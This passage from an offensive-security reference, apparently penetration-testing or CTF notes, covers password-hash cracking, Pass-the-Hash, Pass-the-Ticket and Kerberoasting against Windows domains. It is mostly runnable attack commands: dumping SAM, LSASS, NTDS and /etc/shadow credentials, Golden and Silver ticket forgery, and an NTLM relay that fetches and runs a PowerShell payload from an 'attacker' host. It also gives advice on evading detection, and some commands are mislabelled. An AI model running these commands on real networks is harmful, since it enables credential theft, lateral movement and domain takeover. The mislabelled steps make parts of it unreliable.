# Lowercase letters, 8 characters

# GPU acceleration
hashcat -a 0 -m 0 hashes.txt rockyou.txt --workload-profile=4 -O
```

**SHA-1 Hash Cracking**

```bash
john --format=raw-sha1 --wordlist=rockyou.txt hashes.txt

hashcat -a 0 -m 100 hashes.txt rockyou.txt
# -m 100: SHA-1 hash type

# Salted SHA-1 (format: username:salt:hash)
hashcat -a 0 -m 120 hashes.txt rockyou.txt
```

**SHA-256 Hash Cracking**

```bash
john --format=raw-sha256 --wordlist=rockyou.txt hashes.txt

hashcat -a 0 -m 1400 hashes.txt rockyou.txt
# -m 1400: SHA-256 hash type

# Salted SHA-256
hashcat -a 0 -m 1410 hashes.txt rockyou.txt
```

**NTLM Hash Cracking (Windows)**

Extract NTLM hashes from SAM database:

```bash
# From live Windows system (requires SYSTEM privilege)
reg save HKLM\SAM C:\SAM
reg save HKLM\SYSTEM C:\SYSTEM

# Transfer files to attack system
# Use tools like secretsdump.py to extract hashes
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

# Output format: username:RID:LMHash:NTLMHash
```

Crack NTLM hashes:

```bash
# John the Ripper
john --format=nt --wordlist=rockyou.txt hashes.txt

# Hashcat
hashcat -a 0 -m 1000 hashes.txt rockyou.txt
# -m 1000: NTLM hash type

# Separate LM and NTLM portions (if both available)
hashcat -a 0 -m 3000 hashes.txt rockyou.txt
# -m 3000: LM hash type (legacy)
```

Process domain credential format:

```bash
# Format: domain\username:ntlm_hash
awk -F: '{print $3":"$4}' domainlogins.txt > ntlm_hashes.txt
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt
```

**Kerberos Hash Cracking (AS-REP)**

Extract Kerberos hashes from captured TGT requests:

```bash
# Using GetUserSPNs.py against Active Directory
python3 GetUserSPNs.py -request -dc-ip target_host domain.com/user > kerberos_hashes.txt

# Using Impacket roast
python3 -m impacket.GetUserSPNs -request -dc-ip target_host domain.com/user
```

Crack Kerberos hashes:

```bash
# Hashcat Kerberos TGS-REP (service ticket)
hashcat -a 0 -m 13100 kerberos_hashes.txt rockyou.txt
# -m 13100: Kerberos TGS-REP hash type

# Hashcat Kerberos AS-REP (pre-authentication not required)
hashcat -a 0 -m 18200 kerberos_hashes.txt rockyou.txt
# -m 18200: Kerberos AS-REP hash type

# John the Ripper Kerberos
john --format=krb5tgs --wordlist=rockyou.txt kerberos_hashes.txt
```

**bcrypt Hash Cracking**

[Inference] bcrypt uses adaptive hashing with configurable work factor. Cracking significantly slower than MD5/SHA.

```bash
john --format=bcrypt --wordlist=rockyou.txt hashes.txt

hashcat -a 0 -m 3200 hashes.txt rockyou.txt
# -m 3200: bcrypt hash type
```

Bcrypt cracking is computationally expensive; GPU acceleration is essential:

```bash
hashcat -a 0 -m 3200 hashes.txt rockyou.txt --workload-profile=4 -O

# -O: kernel optimization

# --workload-profile=4: maximum resource usage
````

**Hash Extraction from Various Sources**

Extract hashes from system files:

```bash
# Linux /etc/shadow (requires root)
sudo cat /etc/shadow | grep -v "^#" | cut -d: -f1,2 > user_hashes.txt

# Windows SAM via Volume Shadow Copy
wmic shadowcopy call create (call="%systemroot%")
vssadmin list shadows
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam" C:\sam

# Password hash extraction via DPAPI
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Active Directory NTDS.dit extraction
python3 secretsdump.py -ntds ntds.dit -system system LOCAL

# Web application hashes (database exports)
# MySQL password table
SELECT user, authentication_string FROM mysql.user;

# WordPress password hashes
SELECT user_login, user_pass FROM wp_users;
````

**Dictionary Attack with Rules**

Apply transformation rules to dictionary words:

```bash
# John the Ripper with built-in rules
john --wordlist=rockyou.txt --rules:best hashes.txt

# Custom rule file
cat > custom_rules.txt << 'EOF'
# Capitalize first letter
c
# Append numbers 2024-2025
$2 $0 $2 $4
$2 $0 $2 $5
# Append special characters
$! $@
EOF

john --wordlist=rockyou.txt --rules=custom_rules hashes.txt

# Hashcat rule engine
# Apply common substitutions and appendages
hashcat -a 0 -m 1000 hashes.txt rockyou.txt -r rules/best64.rule

# Chained rules
hashcat -a 0 -m 1000 hashes.txt rockyou.txt -r rules/best64.rule -r rules/leetspeak.rule
```

**Mask Attack (Pattern-Based Cracking)**

Define password patterns for brute force within constraints:

```bash
# Hashcat mask syntax
# ?l = lowercase letter
# ?u = uppercase letter
# ?d = digit
# ?s = special character
# ?a = all character classes

# Common pattern: Word + 4 digits
hashcat -a 3 -m 1000 hashes.txt dictionary.txt "?d?d?d?d"

# Pattern: Capital letter + 7 lowercase + 2 digits
hashcat -a 3 -m 1000 hashes.txt "?u?l?l?l?l?l?l?l?d?d"

# Pattern: 8-character lowercase
hashcat -a 3 -m 1000 hashes.txt "?l?l?l?l?l?l?l?l"

# Incremental patterns
hashcat -a 3 -m 1000 hashes.txt "?l?l?l?l" --increment --increment-min=4 --increment-max=8
```

**Distributed Hash Cracking**

Distribute cracking across multiple systems:

```bash
# Using hashcat with multiple GPUs
hashcat -a 0 -m 1000 hashes.txt rockyou.txt -d 1,2,3
# -d 1,2,3: utilize GPUs 1, 2, and 3

# Distributed using hashtopolis (hash cracking framework)
# Setup hashtopolis server and agents across multiple machines
# Distribute hash workload automatically

# Manual distribution via file splitting
split -l 1000 hashes.txt hashes_split_

# Process each split on separate system
for file in hashes_split_*; do
    hashcat -a 0 -m 1000 "$file" rockyou.txt > "${file}_cracked.txt" &
done
wait

# Aggregate results
cat hashes_split_*_cracked.txt > all_cracked.txt
```

**Performance Optimization**

Maximize hash cracking speed:

```bash
# GPU selection and optimization
hashcat -I
# Lists available devices

hashcat -a 0 -m 1000 hashes.txt rockyou.txt -d 1 --workload-profile=4 -O
# -O: kernel optimization (faster but reduced accuracy for some algorithms)
# --workload-profile=4: maximum resource usage

# Session resumption
hashcat -a 0 -m 1000 hashes.txt rockyou.txt --session=session1 --restore
# Save progress and resume later

# Disable output during cracking
hashcat -a 0 -m 1000 hashes.txt rockyou.txt -q
# -q: quiet mode
```

**Hash Cracking Pipeline (Multiple Algorithms)**

Process unknown hash formats sequentially:

```bash
#!/bin/bash
HASHES="hashes.txt"
WORDLIST="rockyou.txt"

# MD5
echo "[*] Attempting MD5..."
hashcat -a 0 -m 0 "$HASHES" "$WORDLIST" -q --outfile=cracked_md5.txt

# SHA-1
echo "[*] Attempting SHA-1..."
hashcat -a 0 -m 100 "$HASHES" "$WORDLIST" -q --outfile=cracked_sha1.txt

# SHA-256
echo "[*] Attempting SHA-256..."
hashcat -a 0 -m 1400 "$HASHES" "$WORDLIST" -q --outfile=cracked_sha256.txt

# NTLM
echo "[*] Attempting NTLM..."
hashcat -a 0 -m 1000 "$HASHES" "$WORDLIST" -q --outfile=cracked_ntlm.txt

# bcrypt
echo "[*] Attempting bcrypt..."
hashcat -a 0 -m 3200 "$HASHES" "$WORDLIST" -q --outfile=cracked_bcrypt.txt

# Aggregate successful cracks
cat cracked_*.txt > all_cracked.txt
```

**Rainbow Table Attack (When Applicable)**

[Unverified] Rainbow tables are precomputed hash-to-plaintext mappings. Practical utility depends on hash algorithm and salt usage.

```bash
# Search rainbow tables online (crackstation.net, rainbowtables.it)
# Or generate custom tables for CTF scenarios

# Using rainbowcrack
rtgen md5 loweralpha 1 8 0 33554432 0

# Using generated rainbow tables
rcrack *.rt -h 5f4dcc3b5aa765d61d8327deb882cf99

# Online lookup
curl "https://crackstation.net/api/lookup?hash=5f4dcc3b5aa765d61d8327deb882cf99&timeout=5"
```

**Salted Hash Cracking**

Salted hashes are significantly harder to crack due to unique salt per hash:

```bash
# Extract salt and hash separately
# Format: username:salt:hash

awk -F: '{print $3":"$2":"$1}' salted_hashes.txt > formatted_hashes.txt

# John the Ripper with salt handling
john --format=sha512crypt --wordlist=rockyou.txt formatted_hashes.txt

# Hashcat salted hashes
hashcat -a 0 -m 1710 formatted_hashes.txt rockyou.txt
# -m 1710: SHA-512 salted

# Custom salt handling
#!/bin/bash
while IFS=: read -r username salt hash; do
    # For each password, compute hash with salt
    for password in $(cat rockyou.txt); do
        computed_hash=$(echo -n "$salt$password" | sha256sum | cut -d' ' -f1)
        if [ "$computed_hash" = "$hash" ]; then
            echo "[+] $username:$password"
        fi
    done
done < salted_hashes.txt
```

**Online Hash Lookups**

Leverage precomputed hash databases:

```bash
# CrackStation API
curl "https://crackstation.net/api/lookup?hash=5f4dcc3b5aa765d61d8327deb882cf99&timeout=5"

# MD5Online
curl "https://www.md5online.com/api/md5?hash=5f4dcc3b5aa765d61d8327deb882cf99"

# MD5Decrypt
curl "https://md5decrypt.net/api/api.php?hash=5f4dcc3b5aa765d61d8327deb882cf99&hash_type=md5&email=deanna_abshire@gmail.com"

# Batch lookup script
#!/bin/bash
HASHES="hashes.txt"

while read -r hash; do
    result=$(curl -s "https://crackstation.net/api/lookup?hash=$hash&timeout=5" | grep -oP '"plaintext":"\K[^"]*')
    if [ -n "$result" ]; then
        echo "$hash:$result" >> cracked_hashes.txt
    fi
done < "$HASHES"
```

**Hash Cracking Forensics and Reporting**

Document cracking results:

```bash
# Format cracked hashes with metadata
#!/bin/bash

echo "Hash Cracking Report" > crack_report.txt
echo "===================" >> crack_report.txt
echo "" >> crack_report.txt

while read -r hash plaintext; do
    echo "Hash: $hash" >> crack_report.txt
    echo "Plaintext: $plaintext" >> crack_report.txt
    echo "Length: ${#plaintext}" >> crack_report.txt
    
    # Analyze password complexity
    if [[ "$plaintext" =~ [0-9] ]] && [[ "$plaintext" =~ [A-Z] ]]; then
        echo "Complexity: High" >> crack_report.txt
    elif [[ "$plaintext" =~ [0-9] ]] || [[ "$plaintext" =~ [A-Z] ]]; then
        echo "Complexity: Medium" >> crack_report.txt
    else
        echo "Complexity: Low" >> crack_report.txt
    fi
    echo "---" >> crack_report.txt
done < cracked_hashes.txt
```

**GPU-Accelerated Cracking Setup**

Optimize hash cracking environment:

```bash
# Install NVIDIA CUDA and drivers (for NVIDIA GPU)
# For Kali Linux:
sudo apt-get install nvidia-driver-XXX nvidia-cuda-toolkit

# Verify GPU detection
nvidia-smi
hashcat -I

# AMD GPU support (HIP)
sudo apt-get install hip-rocm

# Verify hashcat GPU support
hashcat -I

# Benchmark GPU performance
hashcat -b -m 1000
```

---

## Pass-the-Hash

Pass-the-Hash (PtH) attacks enable lateral movement and privilege escalation by using captured NTLM hashes to authenticate to systems without needing plaintext passwords, exploiting NTLM authentication mechanisms that accept password hashes directly.

**NTLM Hash Capture and Extraction**

Extract NTLM hashes from compromised systems:

```bash
# From registry (requires admin/SYSTEM)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# Using secretsdump from Impacket
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

# From live system (requires admin)
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c local
```

Windows-specific hash extraction:

```powershell
# Mimikatz (requires admin/SYSTEM)
mimikatz # lsadump::sam
mimikatz # lsadump::lsa /patch
mimikatz # sekurlsa::logonpasswords

# Hashcat ntlm capture
ntlm::list
```

NTLM hash format: `username:UID:LMHash:NTHash`

Example:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

The LM hash portion (first 32 characters) is deprecated and often shows `aad3b435b51404eeaad3b435b51404ee` (empty hash). The NTLM hash (second 32 characters) is the exploitable component.

**Hash Validation and Verification**

Verify extracted hashes are valid format:

```bash
# Check hash format
echo "username:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c" | awk -F: '{print length($4)}'
# Output: 32 (valid NTLM hash)

# Test hash against known plaintext
hashcat -m 1000 hash.txt wordlist.txt --show
```

[Inference] NTLM hash validity depends on format (32-character hexadecimal string) and authentication mechanism support on target systems, though validation occurs during authentication attempt rather than hash inspection.

**Pass-the-Hash with SMB**

Authenticate to SMB shares using NTLM hashes:

```bash
# Using pth-winexe from Impacket
pth-smbclient -U "DOMAIN/user%LMHash:NTHash" //<target>/sharename

# Using crackmapexec
crackmapexec smb <target> -u user -H "NTHash"
crackmapexec smb <target> -u user -H "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"

# Manual smbclient with hash
smbclient //<target>/share -U "DOMAIN/user" --pw-nt-hash <NTHash>
```

[Inference] SMB PtH exploitation works on systems with NTLM authentication enabled where the server accepts hashes directly rather than requiring plaintext password processing, though modern Windows versions default to NTLMv2 with enhanced security.

**Pass-the-Hash with RDP**

Authenticate to RDP services using NTLM hashes:

```bash
# Using xfreerdp
xfreerdp /v:<target> /u:<user> /pth:<hash> /d:DOMAIN

# Using freerdp with hash
freerdp /v:<target> /u:user /pth:<hash>

# Restricted Admin Mode (Windows 8.1+, Server 2012 R2+)
xfreerdp /v:<target> /u:user /pth:<hash> /restricted-admin
```

[Unverified] Restricted Admin mode enables RDP PtH attacks on newer Windows versions by using cached credentials with restricted authentication context, though [Inference] exploitation requires Restricted Admin mode to be enabled and the authenticating user to have appropriate privileges.

Alternative using `pth-rpcclient`:

```bash
pth-rpcclient -U "DOMAIN/user%LMHash:NTHash" <target>
```

**Pass-the-Hash with WinRM**

Execute commands via WinRM using NTLM hashes:

```bash
# Using evil-winrm
evil-winrm -i <target> -u user -H <NTHash> -d DOMAIN

# Using crackmapexec
crackmapexec winrm <target> -u user -H <NTHash>

# Using impacket-wmiexec
impacket-wmiexec -hashes :<NTHash> DOMAIN/user@<target>
```

WinRM PtH requires [Inference] the target system to have WinRM service enabled (typically on server systems and workstations in enterprise domains) and the authenticating user to have appropriate privileges for command execution.

**Pass-the-Hash with LDAP**

Query LDAP services using NTLM authentication:

```bash
# Using ldapclient with hash
ldapsearch -H ldap://<target> -U "DOMAIN\user" -W <NTHash> -b "dc=domain,dc=local"

# Using impacket-ldapdomaindump
impacket-ldapdomaindump -u "DOMAIN/user" -p ":<NTHash>" --no-pass <target>

# Using crackmapexec for LDAP
crackmapexec ldap <target> -u user -H <NTHash>
```

LDAP PtH enables [Inference] domain reconnaissance and information gathering through LDAP queries using compromised hashes, allowing enumeration of users, groups, and organizational structure regardless of plaintext password knowledge.

**Pass-the-Hash with Kerberos (Silver Ticket)**

Create Silver Tickets using extracted machine account hashes:

```bash
# Extract machine account hash (NTLM)
# From SAM registry or domain controller

# Create Silver Ticket (krbtgt hash)
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<NTHash> /ticket:ticket.kirbi

# Alternatively, using impacket
impacket-ticketer -nthash <NTHash> -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain DOMAIN.LOCAL -user Administrator ticket.ccache
```

[Inference] Silver Ticket exploitation uses machine account hashes to forge service tickets for specific services, enabling [Inference] access to those services under the forged identity, though exploitation requires knowledge of machine account hashes and valid domain SID.

**Pass-the-Hash Detection and Evasion**

Identify PtH usage through logging:

```
Event ID 4624 (Account Logon) with suspicious NTLMv2 indicators
Event ID 4769 (Kerberos Ticket Granted) showing unusual patterns
Logon Type 3 (Network) with unusual accounts
```

Evade detection through:

```bash
# Use legitimate service accounts with extracted hashes
# Conduct PtH during normal business hours
# Use commonly accessed systems as intermediate targets
# Distribute hash usage across multiple source systems

# Timing attacks to blend with legitimate activity
crackmapexec smb <target-range> -u user -H <NTHash> --continue-on-success
```

[Inference] PtH evasion exploits detection blind spots where NTLM authentication logs show account logon but [Inference] detection systems struggle to distinguish legitimate authentication from compromised hash usage without behavioral analysis, though modern EDR solutions implement hash-based detection signatures.

**Constrained Delegation with Pass-the-Hash**

Exploit constrained delegation using compromised service account hashes:

```bash
# Extract service account hash
# Use S4U2Proxy to obtain tickets for delegated services

impacket-getST -hashes :<NTHash> -impersonate Administrator -spn cifs/target DOMAIN/serviceaccount@DOMAIN.LOCAL
```

[Inference] Constrained delegation PtH exploitation enables impersonation of arbitrary users for services configured in delegation list, allowing lateral movement to administratively-sensitive systems when combined with S4U2Proxy protocol support.

**Pass-the-Hash via Responder and NTLM Relay**

Capture and relay NTLM hashes through man-in-the-middle:

```bash
# Start Responder to capture hashes
responder -I eth0 -r -w

# NTLM relay to SMB
impacket-ntlmrelayx -t smb://<target> -c "powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://attacker/payload.ps1\")'"

# NTLM relay to LDAP
impacket-ntlmrelayx -t ldap://<target-dc> --escalate-user targetuser
```

[Unverified] NTLM relay attacks capture authentication traffic through network positioning (MITM) and relay credentials to target services, enabling [Inference] exploitation of systems configured to trust relay sources or systems where SMB Signing is not enforced.

**Hash Cracking for Plaintext Recovery**

Crack extracted NTLM hashes to obtain plaintext passwords:

```bash
# Using hashcat
hashcat -m 1000 hashes.txt wordlist.txt
hashcat -m 1000 hashes.txt wordlist.txt --show

# Using john
john --format=NT hashes.txt
john --format=NT hashes.txt --show

# Using rainbow tables
rtgen ntlm loweralpha 1 8 0 100000 0 /path/to/tables
rcrack /path/to/tables/*.rt hashes.txt
```

NTLM hash cracking enables [Inference] plaintext password recovery for offline attacks or situations where pass-the-hash is not applicable, though cracking success depends on password strength and computational resources.

**Pass-the-Hash Across Trusts**

Exploit trust relationships for cross-domain PtH:

```bash
# Identify domain trusts
nltest /domain_trusts

# Use PtH across trusts
crackmapexec smb <trusted-domain-target> -u "DOMAIN/user" -H <NTHash> --continue-on-success

# Create inter-realm tickets using forged credentials
impacket-ticketer -nthash <NTHash> -domain-sid <TRUSTED-SID> -domain TRUSTED.LOCAL -user Administrator ticket.ccache
```

[Inference] Cross-domain PtH exploitation enables lateral movement between forest domains when trust relationships exist and compromised accounts have cross-domain permissions, though [Unverified] trust exploitation depends on specific trust type (external, transitive, bidirectional) and authentication policies.

---

## Pass-the-Ticket

Pass-the-Ticket (PtT) attacks enable lateral movement and privilege escalation by using stolen Kerberos tickets to authenticate to systems without needing NTLM hashes or plaintext passwords, exploiting Kerberos ticket caching and reuse mechanisms.

**Kerberos Ticket Extraction**

Extract cached Kerberos tickets from compromised systems:

```bash
# List cached tickets
klist
klist -c /tmp/ccache_file

# Extract tickets using Mimikatz (requires admin/SYSTEM)
mimikatz # kerberos::list
mimikatz # kerberos::list /export

# Export tickets via klist
klist -c /tmp/ccache_file -e
```

Ticket locations by system:

- **Linux/Unix**: `/tmp/krb5cc_[UID]` (Kerberos credential cache)
- **macOS**: `/var/tmp/krb5cc_[UID]`
- **Windows**: LSASS process memory (extracted via Mimikatz)

Ticket format inspection:

```bash
# Examine exported ticket structure
file ticket.kirbi
hexdump -C ticket.kirbi | head -20
```

[Inference] Kerberos tickets contain encryption material and user identity information usable for authentication regardless of original ticket acquisition method, enabling reuse on any system with network access to Kerberos services.

**Ticket Injection and Reuse**

Import extracted tickets for local authentication:

```bash
# Import cached ticket (Linux/Unix)
export KRB5CCNAME=/tmp/ccache_file
kinit -c /tmp/ccache_file --keytab=ticket.ccache

# Alternative import method
kinit -c /tmp/ccache_file -C ticket.ccache user@DOMAIN.LOCAL

# Verify ticket import
klist -c /tmp/ccache_file
```

Windows ticket injection:

```powershell
# Mimikatz ticket injection
mimikatz # kerberos::ptt ticket.kirbi

# Verify injected tickets
klist
```

[Inference] Injected tickets function identically to legitimately obtained tickets, enabling authentication to services configured to accept Kerberos tickets from the injected identity, though [Unverified] ticket validity depends on ticket expiration and server clock synchronization.

**TGT Theft and Abuse**

Ticket-Granting Tickets (TGTs) enable acquisition of additional service tickets without contacting the KDC:

```bash
# Extract TGT using Mimikatz
mimikatz # sekurlsa::tickets /export

# Locate exported TGTs
ls -la *.kirbi | grep krbtgt

# Inject TGT for lateral movement
mimikatz # kerberos::ptt [0;12a60]-0-0-40a10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi
```

TGT reuse enables [Inference] acquiring new service tickets for any service within the domain without password or hash knowledge, though [Unverified] TGT validity depends on specific Kerberos implementation regarding ticket reuse restrictions.

**Silver Ticket Creation (Service Account Hash)**

Forge service-specific tickets using machine account hashes:

```bash
# Extract service account hash (NTLM)
# Service hashes available from NTDS.DIT or SAM

# Create Silver Ticket for CIFS service
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:SERVER.DOMAIN.LOCAL /service:cifs /rc4:<ServiceHash> /ticket:silver.kirbi

# Alternative using impacket
impacket-ticketer -nthash <ServiceHash> -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain DOMAIN.LOCAL -user Administrator -spn cifs/SERVER.DOMAIN.LOCAL silver.ccache
```

Silver Ticket services (common SPNs):

```
cifs/server.domain.local  (SMB file shares)
ldap/dc.domain.local  (LDAP directory)
krbtgt/domain.local  (KDC services)
http/server.domain.local  (HTTP services)
mssql/server.domain.local  (SQL Server)
wsman/server.domain.local  (WinRM)
```

[Inference] Silver Tickets enable access to specific services under forged identities, restricted to the service specified in the ticket, though forged tickets bypass standard authentication checks when accepted by service principals.

**Golden Ticket Creation (Krbtgt Hash)**

Forge domain-wide tickets using Krbtgt hash (covered in detail in Golden Ticket Attacks section):

```bash
# Extract Krbtgt hash from domain controller
impacket-secretsdump -dc-ip <DC-IP> DOMAIN/user:password@<DC>

# Create Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:golden.kirbi

# Inject and reuse Golden Ticket
mimikatz # kerberos::ptt golden.kirbi
klist
```

Golden Tickets enable [Inference] access to any domain resource under any forged identity, providing persistent domain access regardless of password changes, though [Unverified] ticket validity depends on Krbtgt hash remaining unchanged or authentication policies implementing ticket validation.

**Pass-the-Ticket with Service Impersonation**

Use PtT to impersonate high-privilege accounts:

```bash
# Extract admin TGT
mimikatz # sekurlsa::tickets /export

# Inject admin TGT
mimikatz # kerberos::ptt [0;12a60]-2-0-40a10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi

# Access resources as admin
klist
crackmapexec smb <target> -u Administrator --use-kcache
```

[Inference] TGT impersonation enables lateral movement to systems and services where the forged identity has permissions, though exploitation impact depends on forged account's domain privilege level and service configurations.

**Pass-the-Ticket with S4U2Self and S4U2Proxy**

Exploit service delegation using forged tickets (detailed in Kerberoasting section):

```bash
# Create forged service ticket via S4U2Self
impacket-getST -impersonate Administrator -spn cifs/SERVER DOMAIN/serviceaccount:password@<DC>

# Alternative with hash
impacket-getST -hashes :<Hash> -impersonate Administrator -spn cifs/SERVER DOMAIN/serviceaccount@<DC>

# Inject and use delegated ticket
export KRB5CCNAME=./Administrator.ccache
klist
```

[Inference] S4U2Self/S4U2Proxy exploitation enables impersonation of arbitrary users when service accounts have delegation configured, allowing privilege escalation to domain administrator levels through forged tickets.

**Ticket Lifetime and Renewal**

Analyze and extend ticket validity:

```bash
# Check ticket lifetime
klist -c /tmp/ccache_file

# TGT renewal (valid for full lifetime + renewability period)
kinit -R -c /tmp/ccache_file

# Create long-lifetime forged tickets
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<Hash> /ticket:golden.kirbi /startoffset:0 /endin:35791394 /renewmax:35791394
```

[Inference] Extended ticket lifetimes in forged tickets enable longer persistence compared to legitimate tickets, though [Unverified] ticket validity windows depend on domain Kerberos policy settings and domain controller clock synchronization.

**Pass-the-Ticket Detection and Evasion**

Identify PtT usage through logging:

```
Event ID 4768 (Kerberos Authentication Ticket Requested)
Event ID 4769 (Kerberos Service Ticket Requested)
Event ID 4770 (Kerberos Service Ticket Renewed)
Event ID 4771 (Kerberos Pre-Authentication Failed)
```

Evade detection through:

```bash
# Use legitimate service accounts' tickets
# Inject tickets during normal logon hours
# Space out ticket usage across multiple services
# Use encryption algorithms common in environment

# Timing attacks
crackmapexec smb <target-range> -u Administrator --use-kcache --continue-on-success
```

[Inference] PtT evasion exploits event log analysis limitations where Kerberos events show ticket usage but detection relies on behavioral analysis to distinguish legitimate ticket reuse from compromised ticket exploitation, though modern EDR solutions implement machine learning-based anomaly detection.

**Cross-Realm Pass-the-Ticket**

Exploit inter-realm trust relationships for cross-forest movement:

```bash
# Extract inter-realm TGT from domain trust
# Trust relationships enable cross-realm Kerberos authentication

# Create inter-realm ticket
impacket-ticketer -nthash <TrustHash> -domain-sid <TRUSTED-DOMAIN-SID> -domain TRUSTED.LOCAL -user Administrator -spn krbtgt/TRUSTED.LOCAL inter-realm.ccache

# Use inter-realm ticket
export KRB5CCNAME=./inter-realm.ccache
klist
```

[Unverified] Cross-realm PtT exploitation enables lateral movement between forest domains when inter-realm trust relationships exist and tickets are accepted by trusting domain, though [Inference] exploitation depends on specific trust type and Kerberos trust configuration.

---

## Kerberoasting

Kerberoasting attacks extract service ticket hashes through legitimate Kerberos authentication, enabling offline password cracking against service accounts without requiring administrative access.

**Service Principal Name (SPN) Enumeration**

Identify service accounts suitable for Kerberoasting:

```bash
# Query Kerberos for SPNs
setspn -T DOMAIN.LOCAL -F -Q */*

# Using GetUserSPNs.py (Impacket)
impacket-GetUserSPNs DOMAIN.LOCAL/user:password

# Query specific domain controller
impacket-GetUserSPNs -dc-ip <DC-IP> DOMAIN.LOCAL/user:password

# LDAP-based SPN enumeration
ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "servicePrincipalName=*" sAMAccountName
```

SPN format analysis:

```
service_class/hostname:port/service_name
cifs/server.domain.local
http/webapp.domain.local:8080
mssql/database.domain.local
```

[Inference] SPNs identify service accounts running under non-machine identities, enabling targeted Kerberoasting attacks against accounts where password cracking is feasible compared to machine account passwords.

**Kerberos TGS Ticket Extraction**

Request service tickets for cracking:

```bash
# Using GetUserSPNs.py with -request flag
impacket-GetUserSPNs DOMAIN.LOCAL/user:password -request

# Export tickets in format suitable for cracking
impacket-GetUserSPNs -dc-ip <DC-IP> DOMAIN.LOCAL/user:password -request -outputfile hashes.txt

# Alternative: manual klist export (Windows)
setspn -T DOMAIN.LOCAL -F -Q */* > spns.txt
```

[Inference] TGS ticket extraction leverages legitimate user credentials to request service tickets for any SPN in the domain, generating crackable tickets suitable for offline password attacks against service accounts.

**Ticket Format and Extraction**

Analyze extracted TGS tickets:

```bash
# Tickets exported in Hashcat format
cat hashes.txt
# Output format: $krb5tgs$23$*$DOMAIN.LOCAL$SERVICE/SERVER$*$[encrypted_hash]

# Alternative output formats
# John the Ripper: $krb5tgs$[format_indicator]$[encrypted_material]
# Tshark pcap analysis: extract tickets from Kerberos traffic
```

Verify ticket format:

```bash
# Check ticket count
wc -l hashes.txt

# Validate ticket format
head -1 hashes.txt
```

[Unverified] Extracted TGS tickets contain encryption material derived from service account passwords, enabling [Inference] offline brute-force attacks through comparison of decryption results against known plaintext Kerberos structures.

**Offline TGS Cracking**

Crack extracted tickets to recover service account passwords:

```bash
# Using Hashcat
hashcat -m 13100 hashes.txt wordlist.txt
hashcat -m 13100 hashes.txt wordlist.txt --show

# Using John the Ripper
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
john --format=krb5tgs hashes.txt --show

# GPU acceleration (Hashcat)
hashcat -m 13100 hashes.txt wordlist.txt -d 1 --workload-profile 4
```

[Inference] Kerberoasting cracking success depends on service account password strength and wordlist coverage, with common service account passwords (default credentials, inherited patterns) typically cracked quickly compared to interactive user passwords.

**Silver Ticket Creation from Cracked Passwords**

Use recovered passwords to create forged service tickets:

```bash
# Obtain service account hash from recovered password
echo -n "password" | iconv -f UTF-8 -t UTF-16LE | md5sum

# Create Silver Ticket with recovered password hash
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:SERVER.DOMAIN.LOCAL /service:cifs /rc4:<ServiceHash> /ticket:silver.kirbi
```

[Inference] Silver Tickets created from recovered service account passwords enable persistent access to specific services without requiring additional credential theft or exploitation.

**Kerberoasting Detection and Evasion**

Identify Kerberoasting activity through logging:

```
Event ID 4769 (Kerberos Service Ticket Requested) with unusual patterns
Multiple service ticket requests for different SPNs from single user
Service ticket requests outside normal service access patterns
```

Evade detection through:

```bash
# Request service tickets during normal business hours
# Spread ticket requests across multiple legitimate users
# Request only commonly accessed services
# Use existing legitimate user sessions for ticket requests

# Legitimate workflow
impacket-GetUserSPNs DOMAIN.LOCAL/user:password -request --dc-ip <DC-IP>
```

[Inference] Kerberoasting evasion exploits log analysis limitations where service ticket requests appear legitimate to event parsing systems, though behavioral analysis detecting rapid multi-SPN enumeration may identify suspicious activity patterns.

**Custom Kerberoasting Tools**

Develop targeted Kerberoasting implementations:

```bash
# Using impacket-GetUserSPNs with filtering
impacket-GetUserSPNs DOMAIN.LOCAL/user:password -request | grep -i "sql\|mssql\|http\|cifs" > high-value-spns.txt

# Custom Python exploitation
python3 << 'EOF'
from impacket.krb5.kerberosv5 import getKerberosTGS
from impacket import hashes

# Request TGS for specific SPNs
spn_list = ["cifs/server.domain.local", "mssql/db.domain.local"]
for spn in spn_list:
    tgs = getKerberosTGS(spn, user, password, domain)
    print(f"Extracted TGS for {spn}")
EOF
```

[Unverified] Custom implementations enable targeted Kerberoasting focusing on high-value service accounts or specific SPNs while potentially avoiding standard detection signatures.

**Kerberoasting with Unconstrained Delegation**

Exploit unconstrained delegation for enhanced Kerberoasting:

```bash
# Identify systems with unconstrained delegation
ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "userAccountControl:1.2.840.113556.1.4.803:=524288" sAMAccountName

# Compromise unconstrained delegation system
# Extract cached admin TGT
mimikatz # sekurlsa::tickets /export

# Use admin TGT for Kerberoasting across domain
